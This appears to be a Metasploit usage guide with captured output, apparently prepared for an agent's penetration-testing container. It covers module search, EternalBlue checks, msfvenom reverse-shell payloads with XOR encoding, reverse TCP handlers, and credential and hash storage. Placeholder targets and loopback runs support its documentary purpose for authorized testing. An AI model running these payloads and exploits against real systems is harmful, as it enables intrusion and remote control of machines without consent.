# Metasploit — worked examples

Every block below was executed against the `pen/agent:tools-test` container
(final image `sha256:8c94fb556cac…`, built 2026-09-17T20:44:48Z), and the output
shown is the real captured output with two substitutions: the capture used
`WORK=/tmp/vwork` where the blocks below show `/working/engagements/example`,
and target addresses are placeholders (`192.0.2.x`, `$TARGET`). Where a step is
interactive in a normal terminal, the non-interactive equivalent is shown and
labelled.

Conventions:

```bash
WORK=/working/engagements/example      # per-engagement directory
DBN=/tmp/msfhome/.msf4/database.yml    # msfdb connection file (example 0)
TUNNEL_IP=$(ip -4 -o addr show wg0 | awk '{print $4}' | cut -d/ -f1)  # callback address
TARGET=192.0.2.10                      # an authorized host
```

Take `TUNNEL_IP` from whatever non-loopback interface carries the VPN, and
check it with `ip -4 addr` — do not let Metasploit autodetect `LHOST`.

## 0. One-time: bring the database up (non-root)

`msfdb` aborts as root (`Please run msfdb as a non-root user`). In a normal
terminal you would run `msfdb init` as your own user; here the console runs as
root, so the cluster is initialised as uid 1000 and root attaches to it with
`-y`. `init` on a fresh `$HOME` asks nothing; `reinit`/`delete`, which do
prompt, have a non-interactive form: add `--use-defaults`.

```bash
mkdir -p /tmp/msfhome && chown 1000:1000 /tmp/msfhome
setpriv --reuid=1000 --regid=1000 --clear-groups env HOME=/tmp/msfhome \
  msfdb init </dev/null
```

```text
Running the 'init' command for the database:
Creating database at /tmp/msfhome/.msf4/db
Creating db socket file at /tmp
Starting database at /tmp/msfhome/.msf4/db...waiting for server to start.... done
server started
success
Creating database users
Writing client authentication configuration file /tmp/msfhome/.msf4/db/pg_hba.conf
Stopping database at /tmp/msfhome/.msf4/db
Starting database at /tmp/msfhome/.msf4/db...waiting for server to start.... done
server started
success
Creating initial database schema
Database initialization successful
```

Took 19.6 s, and it also prints gem warnings on stderr (`WARN: Unresolved or
ambiguous specs …`) — cosmetic, and the reason the commands below discard
stderr where it does not matter. Verify the console can see the database:

```bash
msfconsole -q -y "$DBN" -x 'db_status; exit' </dev/null 2>/dev/null
```

```text
[*] Connected to msf. Connection type: postgresql.
```

With no database at all, the same command prints
`[*] postgresql selected, no connection`, and `services`/`hosts`/`creds` answer
`[-] Database not connected`.

## 1. Search for a module by CVE and by product

Interactive equivalent: typing `search cve:2017-0144` at the `msf >` prompt.
Nothing here needs a TTY.

By CVE, with `-c` so each match is one row instead of one row per target:

```bash
msfconsole -q -x 'search cve:2017-0144 -c; exit' </dev/null 2>/dev/null
```

```text
Matching Modules
================

   #  Full Name                                 Disclosure Date  Rank     Check  Name
   -  ---------                                 ---------------  ----     -----  ----
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  auxiliary/scanner/smb/smb_ms17_010        .                normal   Yes    MS17-010 SMB RCE Detection
   2  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/smb/smb_doublepulsar_rce
```

By product, restricted to exploits:

```bash
msfconsole -q -x 'search type:exploit name:apache -c; exit' </dev/null 2>/dev/null
```

```text
   #   Full Name                                                            Disclosure Date  Rank       Check  Name
   -   ---------                                                            ---------------  ----       -----  ----
   0   exploit/linux/persistence/apache_htaccess                            1995-12-01       excellent  Yes    Apache .htaccess Persistence
   1   exploit/multi/http/apache_normalize_path_rce                         2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   2   exploit/windows/http/apache_activemq_traversal_upload                2015-08-19       excellent  Yes    Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload
   3   exploit/multi/http/apache_activemq_jolokia_rce                       2026-04-29       excellent  Yes    Apache ActiveMQ RCE via Jolokia addNetworkConnector
   4   exploit/multi/misc/apache_activemq_rce_cve_2023_46604                2023-10-27       excellent  Yes    Apache ActiveMQ Unauthenticated Remote Code Execution
   5   exploit/linux/http/apache_airflow_dag_rce                            2020-07-14       excellent  Yes    Apache Airflow 1.10.10 - Example DAG Remote Code Execution
```

`name:` matches prose, not paths: `search name:http_version` returns
`[-] No results from search`, while `search fullname:http_version` finds
`auxiliary/scanner/http/http_version`. Export a result set for later grepping
with `-o`:

```bash
msfconsole -q -x "search cve:2017-0144 -o $WORK/modules.csv; exit" </dev/null 2>/dev/null
head -2 "$WORK/modules.csv"
```

```text
[*] Wrote search results to /working/engagements/example/modules.csv
#,Full Name,Disclosure Date,Rank,Check,Name
"0","exploit/windows/smb/ms17_010_eternalblue","2017-03-14","average","Yes","MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption"
```

## 2. Show and set a module's options non-interactively

Interactive equivalent: `use …`, then `show options`, then `set …` at the
prompt. Batch it with `-x`; `use` accepts a full module name or a search index.
A multi-line `-x` string is fine — commands are split on `;`.

```bash
msfconsole -q -x '
  use exploit/windows/smb/ms17_010_eternalblue;
  show missing;
  set RHOSTS 192.0.2.10;
  setg THREADS 1;
  show missing;
  exit' </dev/null 2>/dev/null
```

```text
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html

RHOSTS => 192.0.2.10
THREADS => 1
```

The second `show missing` prints nothing, which is the signal that no required
option is left unset. `Required = yes` in `show options` is the authoritative
marker; `show advanced` adds options that have safe defaults but change
behaviour (`CheckModule`, `ConnectTimeout`, `MaxExploitAttempts`, `Proxies`, …),
and `info` is where `Check supported:` is stated:

```bash
msfconsole -q -x 'info exploit/windows/smb/ms17_010_eternalblue; exit' </dev/null 2>/dev/null \
  | grep -E 'Rank:|Check supported|^  Yes|Disclosed'
```

```text
       Rank: Average
  Disclosed: 2017-03-14
Check supported:
  Yes
```

## 3. Run a check before anything else

`check` still sends packets; run it only against a confirmed target. The output
below is a real run in the test container against its own loopback with nothing
listening, which is why it reads `Connection refused`. The shape on a real
target is the same — same prefix lines, same final verdict line — but the
verdict itself is not reproduced here because it depends on the target and no
authorized host was available to check.

```bash
msfconsole -q -x '
  use exploit/windows/smb/ms17_010_eternalblue;
  set RHOSTS 127.0.0.1;
  set ConnectTimeout 3;
  check;
  exit' </dev/null 2>/dev/null
```

```text
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
RHOSTS => 127.0.0.1
ConnectTimeout => 3
[*] 127.0.0.1:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 127.0.0.1:445 - Rex::ConnectionRefused: The connection was refused by the remote host (127.0.0.1:445).
[*] 127.0.0.1:445 - Scanned 1 of 1 hosts (100% complete)
[*] 127.0.0.1:445 - Cannot reliably check exploitability.
```

The same check through the auxiliary module directly — cheaper when there is no
exploit module in play, and its scan output is column-aligned:

```bash
msfconsole -q -x '
  use auxiliary/scanner/smb/smb_ms17_010;
  set RHOSTS 127.0.0.1;
  set THREADS 1;
  check;
  exit' </dev/null 2>/dev/null
```

```text
RHOSTS => 127.0.0.1
THREADS => 1
[-] 127.0.0.1:445         - Rex::ConnectionRefused: The connection was refused by the remote host (127.0.0.1:445).
[*] 127.0.0.1:445 - Cannot reliably check exploitability.
```

A check result is evidence, not a licence: `Cannot reliably check
exploitability.` means the check proved nothing, and escalating to `exploit`
from there needs explicit confirmation.

## 4. Run a resource script that logs to a file

Interactive equivalent: typing the commands at the prompt and reading the
scrollback. The non-interactive form is a resource file; `spool` tees the
console output into `$WORK` from that point on.

```bash
mkdir -p "$WORK"
cat > "$WORK/recon.rc" <<'RC'
# setg survives use/back, so shared values live here
setg RHOSTS 192.0.2.10
setg THREADS 1
spool /working/engagements/example/recon.log
search cve:2017-0144 -c
use auxiliary/scanner/smb/smb_ms17_010
show missing
spool off
RC

msfconsole -q -r "$WORK/recon.rc" -x 'exit' </dev/null 2>/dev/null
```

```text
[*] Processing /working/engagements/example/recon.rc for ERB directives.
resource (/working/engagements/example/recon.rc)> setg RHOSTS 192.0.2.10
RHOSTS => 192.0.2.10
resource (/working/engagements/example/recon.rc)> setg THREADS 1
THREADS => 1
resource (/working/engagements/example/recon.rc)> spool /working/engagements/example/recon.log
```

The spool file that run produced:

```bash
cat "$WORK/recon.log"
```

```text
[*] Spooling to file /working/engagements/example/recon.log...
resource (/working/engagements/example/recon.rc)> search cve:2017-0144 -c

Matching Modules
================

   #  Full Name                                 Disclosure Date  Rank     Check  Name
   -  ---------                                 ---------------  ----     -----  ----
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  auxiliary/scanner/smb/smb_ms17_010        .                normal   Yes    MS17-010 SMB RCE Detection
   2  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/smb/smb_doublepulsar_rce

resource (/working/engagements/example/recon.rc)> use auxiliary/scanner/smb/smb_ms17_010
resource (/working/engagements/example/recon.rc)> show missing
resource (/working/engagements/example/recon.rc)> spool off
```

Do not add `-o FILE` to that command: `msfconsole -o` replaces the output
driver, and `spool` then dies with
`[-] Error while running command spool: undefined method '[]' for nil`. `-o` is
the alternative to `spool`, not a companion: it writes the whole run to a file
and prints nothing on stdout.

```bash
msfconsole -q -x 'version; exit' </dev/null -o "$WORK/version.log" 2>/dev/null | wc -c
cat "$WORK/version.log"
```

```text
0
Framework: 6.5.3-dev-
Console  : 6.5.3-dev-
```

Two things `-r` does that `-x` does not: resource files can contain
`<ruby>…</ruby>` blocks (verified: `<ruby>puts "[erb] #{1+1}"</ruby>` printed
`[erb] 2`), and they run before the `-x` commands, so a script can set state the
`-x` string then uses. To capture an ad-hoc session instead,
`makerc "$WORK/session.rc"` writes the commands that were typed; it skips
datastore-only commands, so a session of nothing but `setg` reports
`[-] No commands to save!`.

## 5. Generate a Linux payload

Interactive equivalent: none — `msfvenom` is a one-shot CLI. Progress messages
go to stderr, the artifact to `-o` (or to stdout with `-f raw`).

```bash
mkdir -p "$WORK/payloads"
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.0.2.1 LPORT=4444 \
  -a x64 --platform linux -f elf -o "$WORK/payloads/lin.elf"
file "$WORK/payloads/lin.elf"; sha256sum "$WORK/payloads/lin.elf"
```

```text
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: /working/engagements/example/payloads/lin.elf
/working/engagements/example/payloads/lin.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
8320625dc2b1e3cefbc1f55c9218a54ece13cb87ce7067734a98d88dc99f784f  /working/engagements/example/payloads/lin.elf
```

Passing `-a`/`--platform` explicitly suppresses the `[-] No platform was
selected, choosing … from the payload` notices that otherwise appear on stderr.
The ELF hash is stable for a given payload and `LHOST`/`LPORT`; Windows `exe`
output is not (see below). Delivering this file to a target is the exploit step,
not the generation step.

## 6. Generate a Windows payload with an encoder, and verify it

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.1 LPORT=4444 \
  -a x64 --platform windows -f exe -o "$WORK/payloads/win.exe"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.1 LPORT=4444 \
  -a x64 --platform windows -e x64/xor_dynamic -i 3 \
  -f exe -o "$WORK/payloads/win-enc.exe"
```

```text
No encoder specified, outputting raw payload
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: /working/engagements/example/payloads/win.exe
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 559 (iteration=0)
x64/xor_dynamic succeeded with size 609 (iteration=1)
x64/xor_dynamic succeeded with size 660 (iteration=2)
x64/xor_dynamic chosen with final size 660
Payload size: 660 bytes
Final size of exe file: 7680 bytes
Saved as: /working/engagements/example/payloads/win-enc.exe
```

Confirm the encoder changed the bytes rather than trusting the log line. The
`exe` format injects into a template whose section name is randomised per run
(`--sec-name`), so hashes of two `exe` builds differ even without an encoder;
compare sizes and check the encoder's own report instead.

```bash
sha256sum "$WORK/payloads/win.exe" "$WORK/payloads/win-enc.exe"
```

```text
38a4fb68ee39d45880441a8026fe070be4825d74a52232a8f9a387d714f1d4b1  win.exe
f9a907d742899c1bd0567c362babd2515ea16a9c531786585513deddd49224da  win-enc.exe
```

The verification that actually matters for an encoder is the byte count of the
forbidden characters. `xxd` is **not** installed; `od` and `hexdump` are:

```bash
count_bad() { od -An -v -tx1 "$1" | tr -s ' ' '\n' | grep -cE '^(00|0a)$'; }
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.1 LPORT=4444 \
  -f raw -o "$WORK/payloads/plain.bin" 2>/dev/null
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.1 LPORT=4444 \
  -b '\x00\x0a' -f raw -o "$WORK/payloads/clean.bin"
echo "plain:   $(stat -c%s "$WORK/payloads/plain.bin") bytes, $(count_bad "$WORK/payloads/plain.bin") bad bytes"
echo "encoded: $(stat -c%s "$WORK/payloads/clean.bin") bytes, $(count_bad "$WORK/payloads/clean.bin") bad bytes"
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Saved as: /working/engagements/example/payloads/clean.bin
plain:   509 bytes, 32 bad bytes
encoded: 551 bytes, 0 bad bytes
```

`-b` selects the encoder automatically when `-e` is not given (here it chose
`x64/xor`). `--list encoders`, `--list formats`, `--list archs`,
`--list platforms` and `--list encrypt` enumerate the valid values, and
`msfvenom -p <payload> --list-options` shows that payload's own `LHOST`/`LPORT`
defaults.

## 7. Start a handler in the background and clean it up

Jobs live inside a console process, so a listener that must outlive one command
is a console process started in the background. Interactive equivalent: run
`msfconsole`, then `use exploit/multi/handler`, `run -j`, and stop it with
`jobs -k` — none of which is available without a TTY.

```bash
msfconsole -q -x 'handler -p windows/x64/meterpreter/reverse_tcp -H 127.0.0.1 -P 4446 -n example; sleep 90; exit' \
  </dev/null >"$WORK/handler.log" 2>&1 &
MSF_PID=$!
for i in $(seq 1 20); do sleep 3; ss -lnt | grep -q ':4446' && break; done
ss -lntp | grep ':4446'
kill "$MSF_PID"; sleep 3
ss -lnt | grep -c ':4446'
```

```text
LISTEN 0      256        127.0.0.1:4446      0.0.0.0:*    users:(("ruby",pid=5427,fd=7))
0
```

The listener is up (first line) and gone after the kill (count `0`). The log
shows the job being created:

```bash
cat "$WORK/handler.log"
```

```text
[*] Payload handler running as background job 0.
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4446
[-] Error while running command sleep: SIGTERM
```

The last line is the `kill` landing while the console was in `sleep`. Two
details from that output: the loopback warning is because the test used
loopback — in an engagement `-H` is the tunnel address, and the payload's
`LHOST` must be the same address; and `kill $MSF_PID` is what stops the
listener, because the console process owns the socket.

To manage a handler inside a single console run instead, use the job commands:

```bash
msfconsole -q -x '
  use exploit/multi/handler;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LHOST 127.0.0.1;
  set LPORT 4447;
  set ExitOnSession false;
  run -j;
  sleep 8;
  jobs -l;
  jobs -k 0;
  sleep 2;
  jobs;
  exit' </dev/null 2>/dev/null
```

```text
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => 127.0.0.1
LPORT => 4447
ExitOnSession => false
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4447

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://127.0.0.1:4447

[*] Stopping the following job(s): 0
[*] Stopping job 0

Jobs
====

No active jobs.
```

`run -j` returns immediately, and `Exploit completed, but no session was
created.` refers to the run, not the handler: the listener is up under the job
until `jobs -k` stops it.

## 8. Feed an nmap scan into the database

Interactive equivalent: `db_import` at a console already connected to the
database. The non-interactive form connects with `-y` in the same command. This
example ran against the container's own loopback with a temporary listener on
port 8000, hence the local addresses; on an engagement `$TARGET` is the
authorized host.

```bash
( nc -l 127.0.0.1 8000 & echo $! > /tmp/nc.pid ); sleep 1
nmap -Pn -sT -p 8000,9999 -oX "$WORK/scan.xml" 127.0.0.1
kill "$(cat /tmp/nc.pid)" 2>/dev/null

msfconsole -q -y "$DBN" -x "
  workspace -a example;
  db_import $WORK/scan.xml;
  hosts;
  services;
  exit" </dev/null 2>/dev/null
```

```text
8000/tcp open   http-alt
9999/tcp closed abyss

Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
[*] Added workspace: example
[*] Workspace: example
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.18.10'
[*] Importing host 127.0.0.1
[*] Successfully imported /working/engagements/example/scan.xml

Hosts
=====

address    mac  name       os_name  os_flavor  os_sp  purpose  info  comments
-------    ---  ----       -------  ---------  -----  -------  ----  --------
127.0.0.1       localhost  Unknown                    device

Services
========

host       port  proto  name      state   info  resource  parents
----       ----  -----  ----      -----   ----  --------  -------
127.0.0.1  8000  tcp    http-alt  open          {}
127.0.0.1  9999  tcp    abyss     closed        {}
```

Both open and closed ports are stored, so filter with `services -u` when only
reachable services matter. `db_nmap -Pn -sT -p 8000 127.0.0.1` does the same
scan-and-store in one step; on an engagement it is a scanner and needs the same
authorization as any other scan.

## 9. Push database hosts and credentials into module options

Interactive equivalent: copy addresses out of `hosts` and `set RHOSTS …`. `-R`
does it in place:

```bash
msfconsole -q -y "$DBN" -x '
  workspace default;
  hosts -a 192.0.2.10;
  hosts -a 192.0.2.11;
  use auxiliary/scanner/portscan/tcp;
  hosts -R;
  show options;
  exit' </dev/null 2>/dev/null | grep -E 'RHOSTS|THREADS|CONCURRENCY'
```

```text
RHOSTS => 192.0.2.10 192.0.2.11
   CONCURRENCY  10                     yes       The number of concurrent ports to check per host
   RHOSTS       192.0.2.10 192.0.2.11  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS      1                      yes       The number of concurrent threads (max one per host)
```

`services -R`, `vulns -R` and `creds -R` behave the same way, and `-S` narrows
the set first (`hosts -S 192.0.2.1 -c address,service_count`). Credentials
found by `netexec` or `impacket` go into the same store and back out into module
options:

```bash
msfconsole -q -y "$DBN" -x "
  creds add user:alice password:'hunter2' realm:WORKGROUP;
  creds add user:bob ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A;
  creds -t ntlm;
  exit" </dev/null 2>/dev/null
```

```text
Credentials
===========

id  host  origin  service  public  private                                                            realm  private_type  JtR Format  cracked_password
--  ----  ------  -------  ------  -------                                                            -----  ------------  ----------  ----------------
2                          bob     e2fc15074bf7751dd408e6b105741864:a1074a69b1bde45403ab680504bbdd1a         NTLM hash     nt,lm
```

Those values become `set SMBUser bob; set SMBPass <hash>` (and `SMBDomain`) in
an SMB module; the option names come from that module's `show options`.
`creds -o "$WORK/hashes.hcat"` writes hashcat format, `-o "$WORK/hashes.jtr"`
writes John format, and `-t ntlm -s smb` narrows the list to what an SMB module
can use.

## 10. Export the database to files

Interactive equivalent: `db_export -f xml /path/file.xml` at the console. The
tables export as CSV with `-o`, one file per table; `loot` has no `-o` and must
come out through the XML export.

```bash
mkdir -p "$WORK/db"
msfconsole -q -y "$DBN" -x "
  workspace default;
  services -a -p 443 -s https -r tcp 192.0.2.10;
  services -a -p 22 -s ssh -r tcp 192.0.2.11;
  notes -a -t scan -n 'nmap: 443 open' 192.0.2.10;
  hosts    -o $WORK/db/hosts.csv;
  services -o $WORK/db/services.csv;
  creds    -o $WORK/db/creds.csv;
  creds    -o $WORK/db/creds.jtr;
  creds    -o $WORK/db/creds.hcat;
  vulns    -o $WORK/db/vulns.csv;
  notes    -o $WORK/db/notes.csv;
  loot     -o $WORK/db/loot.csv;
  db_export -f xml    $WORK/db/workspace.xml;
  db_export -f pwdump $WORK/db/workspace.pwdump;
  exit" </dev/null 2>/dev/null | grep -E 'Time|Wrote|export|Invalid'
```

```text
[*] Time: 2026-09-17 21:07:32 UTC Service: host=192.0.2.10 port=443 proto=tcp name=https
[*] Time: 2026-09-17 21:07:32 UTC Service: host=192.0.2.11 port=22 proto=tcp name=ssh
[*] Time: 2026-09-17 21:07:32 UTC Note: host=192.0.2.10 type=scan data=nmap: 443 open
[*] Wrote hosts to /working/engagements/example/db/hosts.csv
[*] Wrote services to /working/engagements/example/db/services.csv
[*] Wrote creds to /working/engagements/example/db/creds.csv
[*] Wrote creds to /working/engagements/example/db/creds.jtr
[*] Wrote creds to /working/engagements/example/db/creds.hcat
[*] Wrote vulnerability information to /working/engagements/example/db/vulns.csv
[*] Wrote notes to /working/engagements/example/db/notes.csv
[-] Invalid host parameter, /working/engagements/example/db/loot.csv.
[*] Starting export of workspace default to /working/engagements/example/db/workspace.xml [ xml ]...
[*] Finished export of workspace default to /working/engagements/example/db/workspace.xml [ xml ]...
[*] Starting export of workspace default to /working/engagements/example/db/workspace.pwdump [ pwdump ]...
[*] Finished export of workspace default to /working/engagements/example/db/workspace.pwdump [ pwdump ]...
```

The `loot` line is the documented failure: `loot` has no `-o`, so the path is
parsed as a host. Everything else wrote a file:

```bash
ls -l "$WORK/db"; head -3 "$WORK/db/services.csv"; cat "$WORK/db/creds.jtr"
```

```text
-rw-r--r-- 1 root root   258 creds.csv
-rw-r--r-- 1 root root    35 creds.hcat
-rw-r--r-- 1 root root    76 creds.jtr
-rw-r--r-- 1 root root   137 hosts.csv
-rw-r--r-- 1 root root    42 notes.csv
-rw-r--r-- 1 root root    49 services.csv
-rw-r--r-- 1 root root    48 vulns.csv
-rw-r--r-- 1 root root   154 workspace.pwdump
-rw-r--r-- 1 root root 11869 workspace.xml
host,port,proto,name,state,info,resource,parents
"192.0.2.10","443","tcp","https","open","","{}",""
"192.0.2.11","22","tcp","ssh","open","","{}",""
bob:2:e2fc15074bf7751dd408e6b105741864:a1074a69b1bde45403ab680504bbdd1a:::2
```

`notes -a` succeeded here but emits a Ruby deprecation stack trace on stderr
(`[DEPRECATION] Using report_note with a non-hash data value…`, seen on the
previous build of this image); stderr is discarded above so it does not pollute
the transcript. The XML export is the complete workspace
(hosts, services, vulns, creds, notes, loot) and can be re-imported with
`db_import`. Before an export is worth anything it has to land in the shared
working directory, not in `/root/.msf4`, which is container-local:

```bash
find "$WORK" -maxdepth 2 \( -name '*.csv' -o -name '*.xml' \) | sort
```

```text
/working/engagements/example/db/creds.csv
/working/engagements/example/db/hosts.csv
/working/engagements/example/db/notes.csv
/working/engagements/example/db/services.csv
/working/engagements/example/db/vulns.csv
/working/engagements/example/db/workspace.xml
/working/engagements/example/modules.csv
/working/engagements/example/scan.xml
```
